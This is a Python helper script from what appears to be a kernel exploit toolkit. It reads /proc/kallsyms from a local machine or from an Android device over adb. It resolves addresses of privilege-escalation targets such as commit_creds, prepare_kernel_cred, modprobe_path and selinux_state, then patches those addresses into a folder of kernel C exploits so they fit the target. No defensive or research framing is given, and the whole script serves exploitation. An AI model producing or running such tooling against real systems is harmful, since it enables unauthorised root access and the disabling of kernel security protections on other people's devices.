#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
resolve_offsets.py — read /proc/kallsyms and rewrite the #define constants in
generated kernel C exploits so they match the target.

  python3 resolve_offsets.py                        # local /proc/kallsyms
  python3 resolve_offsets.py --adb                  # first adb device
  python3 resolve_offsets.py --adb --serial 1.2.3.4:5555
  python3 resolve_offsets.py --dry-run              # show what would change
"""
import argparse, re, subprocess, sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
EXPLOITS = ROOT / "exploits"

# #define name -> candidate kallsyms symbol(s), tried in order
SYMBOLS = {
    "INIT_TASK":           ["init_task"],
    "MODPROBE_PATH":       ["modprobe_path"],
    "COMMIT_CREDS":        ["commit_creds"],
    "PREPARE_KERNEL_CRED": ["prepare_kernel_cred"],
    "KERNEL_BASE":         ["_text", "_stext", "startup_64"],
    "ADDR_LIMIT":          ["addr_limit"],
    "SELINUX_ENFORCING":   ["selinux_state"],
}


def read_kallsyms(use_adb=False, serial=None) -> str:
    if use_adb:
        cmd = ["adb"] + (["-s", serial] if serial else []) + \
              ["shell", "cat /proc/kallsyms"]
    else:
        cmd = ["cat", "/proc/kallsyms"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return r.stdout
    except Exception as e:
        print(f"[!] kallsyms read failed: {e}"); return ""


def parse_syms(text: str) -> dict:
    syms = {}
    for line in text.splitlines():
        p = line.split()
        if len(p) >= 3:
            try:
                syms[p[2]] = int(p[0], 16)
            except ValueError:
                pass
    return syms


def resolve(syms: dict) -> dict:
    out = {}
    for name, cands in SYMBOLS.items():
        for c in cands:
            if c in syms and syms[c]:
                out[name] = syms[c]; break
    return out


def rewrite(cpath: Path, resolved: dict, dry=False) -> int:
    text = cpath.read_text(errors="ignore")
    changed = 0
    for name, val in resolved.items():
        pat = re.compile(rf"(#define\s+{name}\s+)(0x[0-9a-fA-F]+|\d+)(ULL|UL|L)?\b")
        def sub(m):
            nonlocal changed
            changed += 1
            return f"{m.group(1)}0x{val:x}ULL"
        text = pat.sub(sub, text)
    if changed and not dry:
        cpath.write_text(text)
    return changed


def main() -> int:
    ap = argparse.ArgumentParser(prog="resolve_offsets")
    ap.add_argument("--adb", action="store_true", help="read from a connected device")
    ap.add_argument("--serial")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--exploits", default=str(EXPLOITS))
    a = ap.parse_args()

    text = read_kallsyms(a.adb, a.serial)
    if not text:
        print("[!] empty kallsyms (needs root for real addresses)"); return 1

    syms = parse_syms(text)
    if syms and all(v == 0 for v in list(syms.values())[:10]):
        print("[!] all addresses are 0 — set kptr_restrict=0 or run as root")

    resolved = resolve(syms)
    if not resolved:
        print("[!] no target symbols found in kallsyms"); return 1

    print("[*] resolved:")
    for k, v in resolved.items():
        print(f"    {k:<22} 0x{v:x}")

    total = 0
    for c in sorted(Path(a.exploits).glob("*.c")):
        n = rewrite(c, resolved, dry=a.dry_run)
        if n:
            print(f"  [+] {c.name}: {n} constant(s) rewritten"
                  f"{' (dry-run)' if a.dry_run else ''}")
            total += n
    print(f"[+] {total} constant(s) across {len(list(Path(a.exploits).glob('*.c')))} file(s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
